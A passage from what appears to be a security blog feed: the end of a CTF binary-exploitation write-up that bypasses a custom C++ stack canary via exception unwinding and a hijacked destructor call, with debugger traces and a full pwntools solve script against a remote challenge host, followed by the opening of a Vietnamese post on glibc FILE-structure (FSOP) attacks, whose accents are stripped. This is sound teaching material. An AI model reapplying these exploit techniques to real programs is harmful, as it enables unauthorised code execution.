<h2 id="c-exception-handling">C++ exception handling</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> app <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">-&gt;</span>launch();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (...) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;error!!!&#34;</span>);
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>When the check fails, the program will print <code>*** stack smash detected ***</code> using the <code>raise()</code> function. In this case, the program will look for a catch statement to handle the exception and prevent the program from crashing.</p>
<pre tabindex="0"><code>[ DISASM / x86-64 / set emulate on ]
   0x4018f2 &lt;ProtectedBuffer&lt;64ul&gt;::check()+40&gt;    setne  al
   0x4018f5 &lt;ProtectedBuffer&lt;64ul&gt;::check()+43&gt;    test   al, al
   0x4018f7 &lt;ProtectedBuffer&lt;64ul&gt;::check()+45&gt;    je     ProtectedBuffer&lt;64ul&gt;::check()+62                      &lt;ProtectedBuffer&lt;64ul&gt;::check()+62&gt;
 
   0x4018f9 &lt;ProtectedBuffer&lt;64ul&gt;::check()+47&gt;    lea    rax, [rip + 0x7be]
   0x401900 &lt;ProtectedBuffer&lt;64ul&gt;::check()+54&gt;    mov    rdi, rax
  0x401903 &lt;ProtectedBuffer&lt;64ul&gt;::check()+57&gt;    call   raise(char const*)                      &lt;raise(char const*)&gt;
        rdi: 0x4020be  &#39;*** stack smash detected ***&#39;
        rsi: 0xa
        rdx: 0x0
        rcx: 0x20
 
   0x401908 &lt;ProtectedBuffer&lt;64ul&gt;::check()+62&gt;    nop    
   0x401909 &lt;ProtectedBuffer&lt;64ul&gt;::check()+63&gt;    mov    rbx, qword ptr [rbp - 8]
   0x40190d &lt;ProtectedBuffer&lt;64ul&gt;::check()+67&gt;    leave  
   0x40190e &lt;ProtectedBuffer&lt;64ul&gt;::check()+68&gt;    ret    
 
   0x40190f                                        nop    
[ STACK ]
00:0000 rsp 0x7ffdf367cad0  9 /* &#39;\t&#39; */
01:0008     0x7ffdf367cad8  0x7ffdf367cb40  &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
02:0010     0x7ffdf367cae0  0x7ffdf367cb40  &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
03:0018     0x7ffdf367cae8  0x7ffdf367cce8  0x7ffdf367e21e  0x74756f2e612f2e /* &#39;./a.out&#39; */
04:0020 rbp 0x7ffdf367caf0  0x7ffdf367cb10  0x7ffdf367cba0  0x0
05:0028     0x7ffdf367caf8  0x401739 (void ProtectedBuffer&lt;64ul&gt;::mut&lt;BOFApp::launch()::{lambda(char*)#1}&gt;(BOFApp::launch()::{lambda(char*)#1} const&amp;)+51)  nop 
06:0030     0x7ffdf367cb00  0x7ffdf367cb3f  0x4141414141414100
07:0038     0x7ffdf367cb08  0x7ffdf367cb40  &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
[ BACKTRACE ]
  0         0x401903 ProtectedBuffer&lt;64ul&gt;::check()+57
   1         0x401739 void ProtectedBuffer&lt;64ul&gt;::mut&lt;BOFApp::launch()::{lambda(char*)#1}&gt;(BOFApp::launch()::{lambda(char*)#1} const&amp;)+51
   2         0x40169d BOFApp::launch()+77
   3         0x403407
   4         0x4f4ab0
   5         0x4f4ab0
   6          0x12000
   7   0x7ffdf367cce8

pwndbg&gt;   
</code></pre><h2 id="stack-unwinding">Stack unwinding</h2>
<p>If it is not found in this function, it will be searched up along the function call chain, and there will be two results:</p>
<ul>
<li>Find the catch, record the catch location, clean the stack starting from the function that throws the exception, until you reach the function where the catch is located, and enter the catch code for processing</li>
<li>If the corresponding catch is not found after walking through the call chain, then call <code>std::terminate()</code>, this function to abort the program by default.</li>
</ul>
<p>If you are curious about that, please feel free to read the <a href="https://baiy.cn/doc/cpp/inside_exception.htm">article</a>.</p>
<p>The next functions called in sequence are: <code>raise-&gt;__cxa_throw-&gt;_Unwind_RaiseException</code>.</p>
<pre tabindex="0"><code>  0x404056 &lt;__cxa_throw+54&gt;    call   _Unwind_RaiseException                      &lt;_Unwind_RaiseException&gt;
        rdi: 0x12c13b0  0x474e5543432b2b00
        rsi: 0x4e76f0 (typeinfo for std::runtime_error)  0x4e75e0 (vtable for __cxxabiv1::__si_class_type_info+16)  0x404120 (__cxxabiv1::__si_class_type_info::~__si_class_type_info())  endbr64 
        rdx: 0x404740 (std::runtime_error::~runtime_error())  endbr64 
        rcx: 0x12c1408  &#39;*** stack smash detected ***&#39;
</code></pre><p>The function <code>_Unwind_RaiseException()</code> takes the address of each frame below to locate the corresponding catch. If it fails to find one, the function calls <code>std::terminate()</code> to abort and exit the program.</p>
<pre tabindex="0"><code>[ BACKTRACE ]
  0         0x404056 __cxa_throw+54
   1         0x402178 raise(char const*)+83
   2         0x4026b2 ProtectedBuffer&lt;64ul&gt;::check()+62
   3         0x4024e3 void ProtectedBuffer&lt;64ul&gt;::mut&lt;BOFApp::launch()::{lambda(char*)#1}&gt;(BOFApp::launch()::{lambda(char*)#1} const&amp;)+51
   4         0x40245a BOFApp::launch()+62
   5       0xdeadbeef
   6       0xdeadbeef
   7       0xdeadbeef

</code></pre><p>So, if we want to continue the flow execution in main, we much provide exactly where the address of the catch block is, so we can continue to exploit it that don&rsquo;t terminate program.</p>
<p>I have found out the address <code>0x4022de</code> that make the program continue execution because it is where the catch block lie.</p>
<pre tabindex="0"><code>  0x41acdd &lt;_Unwind_RaiseException+909&gt;    mov    r14, qword ptr [rbp - 0x10]
   0x41ace1 &lt;_Unwind_RaiseException+913&gt;    mov    r15, qword ptr [rbp - 8]
   0x41ace5 &lt;_Unwind_RaiseException+917&gt;    mov    rbp, qword ptr [rbp]
   0x41ace9 &lt;_Unwind_RaiseException+921&gt;    mov    rsp, rcx
   0x41acec &lt;_Unwind_RaiseException+924&gt;    pop    rcx
  0x41aced &lt;_Unwind_RaiseException+925&gt;    jmp    rcx                           &lt;main+116&gt;
    
   0x4022f1 &lt;main+116&gt;                      endbr64 
   0x4022f5 &lt;main+120&gt;                      mov    rbx, rax
   0x4022f8 &lt;main+123&gt;                      lea    rax, [rbp - 0x18]
   0x4022fc &lt;main+127&gt;                      mov    rdi, rax
   0x4022ff &lt;main+130&gt;                      call   std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()                      &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()&gt;
</code></pre><p>We successfully changed its flow!  it will call to <code>exit()</code> to terminate the program without return.  How can we execute the <code>backdoor()</code> function?</p>
<p>Afterwards, the program will proceed to execute the destructor method of this particular object. Let&rsquo;s delve deeper into this process:</p>
<pre tabindex="0"><code>0x4022f1 &lt;main+116&gt;                      endbr64 
   0x4022f5 &lt;main+120&gt;                      mov    rbx, rax
   0x4022f8 &lt;main+123&gt;                      lea    rax, [rbp - 0x18]
   0x4022fc &lt;main+127&gt;                      mov    rdi, rax
  0x4022ff &lt;main+130&gt;                      call   std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()                      &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()&gt;
        rdi: 0x7ffe1006ece8  0x7ffe1006ed40  &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
        rsi: 0x4022f1 (main+116)  endbr64 
        rdx: 0x1
        rcx: 0x4022f1 (main+116)  endbr64     
</code></pre><h2 id="arbitrary-execution">Arbitrary Execution</h2>
<p>We go through and see this will cause SIGSEV when <code>rdx</code> doesn&rsquo;t point to a valid address,</p>
<pre tabindex="0"><code>   0x4027d7 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+29&gt;    mov    rdx, qword ptr [rax]
   0x4027da &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+32&gt;    add    rdx, 8
  0x4027de &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+36&gt;    mov    rdx, qword ptr [rdx]
   0x4027e1 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+39&gt;    mov    rdi, rax
   0x4027e4 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+42&gt;    call   rdx
</code></pre><p>As long as you control the rax register, you can control the rdx register, which results in arbitrary execution.</p>
<p>This function takes out the data from the stack combined with the stack overflow above we can control the rax register.</p>
<pre tabindex="0"><code> 0x4025c9 &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+57&gt;    mov    rbx, rax
   0x4025cc &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+60&gt;    mov    rax, qword ptr [rbp - 0x18]
   0x4025d0 &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+64&gt;    mov    rdi, rax
  0x4025d3 &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+67&gt;    call   std::remove_reference&lt;BOFApp*&amp;&gt;::type&amp;&amp; std::move&lt;BOFApp*&amp;&gt;(BOFApp*&amp;)                      &lt;std::remove_reference&lt;BOFApp*&amp;&gt;::type&amp;&amp; std::move&lt;BOFApp*&amp;&gt;(BOFApp*&amp;)&gt;
        rdi: 0x4022c6 (main+73)  call 0xffffffffe907ac13
        rsi: 0x4022f1 (main+116)  endbr64 
        rdx: 0x1
        rcx: 0x4022f1 (main+116)  endbr64
</code></pre><p>Finally, we manage to control rdx register to point to the <code>backdoor()</code> function.</p>
<pre tabindex="0"><code> 0x4027d5 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+27&gt;             je     std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+44                      &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+44&gt;
 
   0x4027d7 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+29&gt;             mov    rdx, qword ptr [rax]
   0x4027da &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+32&gt;             add    rdx, 8
   0x4027de &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+36&gt;             mov    rdx, qword ptr [rdx]
   0x4027e1 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+39&gt;             mov    rdi, rax
  0x4027e4 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+42&gt;             call   rdx                           &lt;backdoor()&gt;
        rdi: 0x4eb0c0 (user_canary)  0x4eb0c0
        rsi: 0x4eb0c0 (user_canary)  0x4eb0c0
        rdx: 0x402263 (backdoor())  endbr64 
        rcx: 0x4022f1 (main+116)  endbr64 
 
   0x4027e6 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+44&gt;             nop    
   0x4027e7 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+45&gt;             leave  
   0x4027e8 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+46&gt;             ret    
 
   0x4027e9                                                                         nop    
   0x4027ea &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::get() const&gt;    endbr64 
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[DEBUG] Received <span style="color:#ae81ff">0x1c</span> bytes:
</span></span><span style="display:flex;"><span>    b<span style="color:#960050;background-color:#1e0010">&#39;</span>sh: <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span>readflag: not found<span style="color:#960050;background-color:#1e0010">\</span>n<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>sh: <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span>readflag: not found
</span></span></code></pre></div><h2 id="exploit-script">Exploit script</h2>
<blockquote>
<p>solve.py</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./a.out&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x420978 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x4038fc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;43.132.193.22&#39;</span>, <span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./a.out&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000042dc10</span>
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000403090</span>
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4bdd62</span>
</span></span><span style="display:flex;"><span>backdoor<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000403387</span>
</span></span><span style="display:flex;"><span>user_canary<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4f4aa0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span>p64(backdoor)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4f4aa0</span>) <span style="color:#75715e"># fake obj</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl<span style="color:#f92672">+</span>(<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(pl))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">96</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x0000000000403407</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4f4aa0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pl)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="reference">Reference</h1>
<p><a href="https://maskray.me/blog/2020-11-08-stack-unwinding">https://maskray.me/blog/2020-11-08-stack-unwinding</a></p>
<p><a href="https://github.com/chop-project/">https://github.com/chop-project/</a></p>
<p><a href="https://www.cnblogs.com/catch/p/3604516.html">https://www.cnblogs.com/catch/p/3604516.html</a></p>
<p><a href="https://baiy.cn/doc/cpp/inside_exception.htm">https://baiy.cn/doc/cpp/inside_exception.htm</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>File Stream Oriented Programming</title>
      <link>https://w1n-gl0ry.github.io/posts/fsop-attack/</link>
      <pubDate>Tue, 08 Aug 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/fsop-attack/</guid>
      <description><![CDATA[<h1 id="file-structure">File Structure</h1>
<p>Ni v <code>FILE STRUCTURE</code> attack (FSOP), nu l 1 ngi chi <code>pwn</code> chc hn mi ngi cng  c nghe qua. Bn thn mnh cng m h v loi tn cng ny, nn mnh quyt nh vit 1 bi research v n.</p>
<p>Theo mnh tm hiu, th k thut ny c <a href="https://github.com/scwuaptx">Angelboy</a> public qua bi vit <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique"> Play with FILE Structure - Yet Another Binary Exploit Technique</a>.</p>
<p>Mnh bt u i vo cc phn c bn nht!</p>
<h1 id="1-file-operator">1. File Operator</h1>
<p><code>FILE</code> l 1 kiu d liu c nh ngha trong glibc v thng c dng khi mun m 1 file trong ngn ng lp trnh C.
Tt nhin, n khc vi khi nim <code>File Descriptor</code> m chng ta thng dng.
Mc ch ca vic dng <code>FILE</code> l  vic thao tc vi cc <code>file operation</code> nhanh hn bng cch s dng <code>buffer</code>  gim thiu s lng syscall c gi (_IO_syscall read, write, &hellip;.). Vn  ny mnh s gii thch k hn  cc phn sau.</p>
<h1 id="2-diving-into-glibc-code">2. Diving into glibc code</h1>
<p>Mnh s s dng <code>GLIBC-2.35</code> source code  tm hiu v <code>FILE STRUCTURE</code>.
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/FILE.h#L7">FILE</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IO_FILE FILE
</span></span></code></pre></div><p>Vy, type <code>FILE</code> thc cht l <code>_IO_FILE</code> struct</p>
<p>Nhn s qua <code>_IO_FILE</code> struct trong glibc 2.35:
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L49">_IO_FILE</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _flags;		<span style="color:#75715e">/* High-order word is _IO_MAGIC; rest is flags. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following pointers correspond to the C++ streambuf protocol. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_ptr;	<span style="color:#75715e">/* Current read pointer */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_end;	<span style="color:#75715e">/* End of get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_base;	<span style="color:#75715e">/* Start of putback+get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_base;	<span style="color:#75715e">/* Start of put area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_ptr;	<span style="color:#75715e">/* Current put pointer. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_end;	<span style="color:#75715e">/* End of put area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_base;	<span style="color:#75715e">/* Start of reserve area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_end;	<span style="color:#75715e">/* End of reserve area. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following fields are used to support backing up and undo. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_base; <span style="color:#75715e">/* Pointer to start of non-current get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_backup_base;  <span style="color:#75715e">/* Pointer to first valid character of backup area */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_end; <span style="color:#75715e">/* Pointer to end of non-current get area. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _IO_marker <span style="color:#f92672">*</span>_markers;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _IO_FILE <span style="color:#f92672">*</span>_chain;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _fileno;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _flags2;
</span></span><span style="display:flex;"><span>  __off_t _old_offset; <span style="color:#75715e">/* This used to be _offset but it&#39;s too small.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* 1+column number of pbase(); 0 is unknown. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> _cur_column;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">char</span> _vtable_offset;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> _shortbuf[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  _IO_lock_t <span style="color:#f92672">*</span>_lock;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _IO_USE_OLD_IO_FILE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><p>Nhn thong qua, rt nhiu kiu d liu c khai bo trong struct.</p>
<p>Ba loi <code>FILE</code> c bn thng c khai bo trong chng trnh (nm trn binary v tr n structure trn libc):</p>
<ul>
<li>_IO_2_1_stderr</li>
<li>_IO_2_1_stdout</li>
<li>_IO_2_1_stdin</li>
</ul>
<p>Ring <code>stdout</code> c th  ch  unbuffered, line-buffered, hoc fully-buffered.</p>
<ul>
<li>Unbuffered - Chng trnh s in ra thit b xut chun cng sm cng tt (khng hn ch).</li>
<li>Line-buffered - Chng trnh s in ra thit b xut chun khi gp k t new-line.</li>
<li>Fully-buffered - Chng trnh s in ra thit b xut chun khi <code>stdout buffers</code> y.</li>
</ul>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/stdfiles.c#L56">_IO_list-all</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE_plus <span style="color:#f92672">*</span>_IO_list_all <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_IO_2_1_stderr_;
</span></span></code></pre></div><p>Glibc mc nh bin <code>_IO_list_all</code> cha 1 linked list tt c cc type <code>FILE</code> trong binary. Mc nh <code>_IO_list_all</code> s tr ti <code>stderr</code> u tin. Cc phn t tip theo s c truy cp qua thuc tnh <code>_chain</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p <span style="color:#f92672">&amp;</span>_IO_list_all
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">=</span> (_IO_FILE_plus <span style="color:#f92672">**</span>) <span style="color:#ae81ff">0x7ffff7dd5520</span> <span style="color:#f92672">&lt;</span>__GI__IO_list_all<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_list_all
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">=</span> (_IO_FILE_plus <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x7ffff7dd5540</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stderr_<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stderr_.file._chain
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span> (_IO_FILE <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x7ffff7dd5620</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stdout_.file._chain
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">11</span> <span style="color:#f92672">=</span> (_IO_FILE <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x7ffff7dd48e0</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdin_<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>_chain</p>
<p><img src="https://hackmd.io/_uploads/H1GG2SVn2.png" alt="chain"></p>
<p>c bit, <code>FILE</code> cn c bao gm trong struct <code>_IO_FILE_plus</code></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L324">_IO_FILE_plus</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE_plus
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  FILE file;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> _IO_jump_t <span style="color:#f92672">*</span>vtable;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>Glibc-2.35</code> c thm struct <code>_IO_FILE_plus</code> l bn m rng ca struct <code>_IO_FILE</code> v ch c cha thm ptr <a href="https://en.wikipedia.org/wiki/Virtual_method_table">vtable</a>, v mi <code>FILE</code> u dng chung 1 <code>vtable</code>. Thng mi <code>FILE</code> (c 3 <code>FILE</code> c bn cng dng <code>_IO_FILE_plus</code> hn l <code>_IO_FILE</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stdout_
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">12</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  file <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    _flags <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">72537977</span>,
